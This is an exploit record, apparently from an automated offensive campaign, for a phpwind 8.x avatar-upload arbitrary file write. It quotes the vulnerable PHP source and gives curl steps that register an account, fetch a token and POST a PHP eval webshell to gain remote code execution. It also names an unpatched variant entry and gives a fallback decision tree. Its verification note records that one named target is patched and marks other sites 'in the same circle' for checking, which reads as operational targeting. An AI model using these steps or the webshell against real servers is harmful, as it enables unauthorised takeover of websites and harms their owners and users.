# phpwind 头像上传任意文件写入（example.com?action=uploadicon&step=2&filename=x.php）

- **code**: phpwind-头像上传任意文件写入-example.com-action-uploadicon-step-2-filename-x.php
- **kind**: exp
- **category**: file-upload
- **component**: phpwind
- **severity**: high
- **language**: http
- **source**: self
- **verified_note**: 【2026-09-30 example.com 白盒复核 → 该写入路径在本目标版本已加白名单+内容校验，实测与源码双向确认封堵，后续同圈子 phpwind 8.7 请先读此结论】

① 源码依据（本轮从目标拉取的 runs/hklot/pw-src，逐行核对）：
  actions/job/uploadicon.php:26   $ext = strtolower(substr(strrchr($_GET['filename'], '.'), 1));
  actions/job/uploadicon.php:30-38
      if (!in_array(strtolower($ext), array('gif','jpg','jpeg','png','bmp'))) { Showmsg('undefined_action'); }
  actions/job/uploadicon.php:48   $filename = "{$winduid}.$ext";        ← 落盘文件名由 uid+白名单扩展名硬编码生成，$_GET['filename'] 的取值部分被完全丢弃，只借用它的扩展名
  actions/job/uploadicon.php:50   $middleDir = "upload/middle/$udir/";   $udir = str_pad(substr($winduid,-2),2,'0',STR_PAD_LEFT)
  actions/job/uploadicon.php:59   if (!$img_size = GetImgSize($middleFile)) { P_unlink($middleFile); Showmsg('upload_content_error'); }   ← 新增内容校验：非合法图片直接删除
  actions/job/uploadicon.php:56   writeover($middleFile, $data);  内容来自 php://input（原始 POST body）

② 黑盒实测对照（前序 vuln-scan 在黑盒阶段完成）：
  GET/POST example.com?action=uploadicon&step=2&filename=x.php  →  返回「非法操作」（对应源码第 37 行 Showmsg('undefined_action')），与 $ext='php' 不在白名单完全吻合。

③ 有效性判定：
  · 传 filename=x.php / x.pHp / x.php.jpg 之类，取到的 $ext 分别是 php / php / jpg —— 只有 jpg 能过白名单，而落盘名恒为 {uid}.jpg，无法得到 .php 落点；
  · 即使通过其它方式让 $ext 为图片类型，第 59 行 GetImgSize 会拒绝非图片内容（图片马方向也被内容校验挡住）；
  · 因此本条目在本目标不可利用，「白名单补丁已打 + 新增内容校验」的判断成立。

结论：example.com（898 与 1852 双实例同源码）上这条写入路径为死路，勿重复投入；同圈子其它 phpwind 8.7 站点若为更早版本仍需单独核对第 30-38 行是否存在。
- **path**: pocs/203.0.113.1-站群跳转机全机地图与负面情报-唯一动态程序-phpwind-7.3.2-全静态页-三套异机真入口/poc.http
- **tags**: phpwind,getshell,文件上传,头像,写入
- **created_at**: 2026-09-28T20:20:44.757Z
- **found_by**: vuln-scan

## 描述

phpwind 头像上传（example.com?action=uploadicon&step=2）的文件名扩展名取自 GET 参数、文件内容为 POST 原始 body 且无图片校验，可写入 upload/middle/{udir}/{uid}.<ext> 实现 getshell。本快照已含扩展名白名单补丁，早期 8.x 版本无。

## 用法

```
先登录（register.php 自助注册即可），再 POST http://TARGET/example.com?action=uploadicon&step=2&filename=x.php，body 为 PHP 代码；文件落在 upload/middle/{uid后两位}/{uid}.php。参考 runs/phpwind-87-arsenal/01-uploadicon-avatar-write.md 与 runs/phase_upload_test.py。
```

## 正文

```
## 原理（源码逐行，本机审计 runs/pw-src/actions/job/uploadicon.php）

```php
// step 非空的 else 分支，第 23 行起
$ext = strtolower(substr(strrchr($_GET['filename'], '.'), 1));   // ★ 扩展名取自 GET，本快照有白名单，早期版本无
$udir = str_pad(substr($winduid, -2), 2, '0', STR_PAD_LEFT);
/* if (!in_array(strtolower($ext), array('gif','jpg','jpeg','png','bmp'))) { Showmsg('undefined_action'); } */  // ★ 本次快照【已有】此白名单
/* if (!file_exists($source)) { Showmsg('头像保存失败...'); } */                                                  // ★ “临时文件须已存在”检查【已被注释掉】
$data = $_SERVER['HTTP_RAW_POST_DATA'] ? $_SERVER['HTTP_RAW_POST_DATA'] : file_get_contents('php://input');
if ($data) {
    $filename = "{$winduid}.$ext";                       // ★ 最终文件名 = 我的 uid + 我指定的扩展名
    $middleFile = PwUpload::savePath($db_ifftp, $filename, "upload/middle/$udir/");
    PwUpload::createFolder(dirname($middleFile));
    writeover($middleFile, $data);                       // ★★ 把 POST 原始 body 逐字节写入（无图片内容校验）
```

## 利用步骤（先决条件：一个已登录的普通账号，可 register.php 自助注册）

```bash
# 1) 取 verify
curl -s -c cookie.txt "http://TARGET/profile.php?action=modify&info_type=face" | grep -o 'verify=[0-9a-f]*'
# 2) 写 PHP
curl -s -b cookie.txt -H "Host: HOST" \
  "http://TARGET/example.com?action=uploadicon&step=2&filename=x.php" \
  --data-binary '<?php @eval($_POST[1]);?>'
# 3) 验证
curl -s -H "Host: HOST" "http://TARGET/upload/middle/XX/{uid}.php" -d "1=phpinfo();"
```

## 变体入口
`u/require/profile/uploadicon.php:23` 同样是 `$ext = ...$_GET['filename']` 且**完全没有白名单**，
但保留了 `if (!file_exists($source))`（需先存在 `{uid}_tmp.<ext>`）。

## 判定
- 无 `undefined_action` → 未打补丁，已写入 → 访问 upload/middle/xx/{uid}.php 验证 RCE
- 返回 `undefined_action` → 已打白名单补丁 → 转其它 Upload 类（见 phpwind-87-arsenal/05）
```
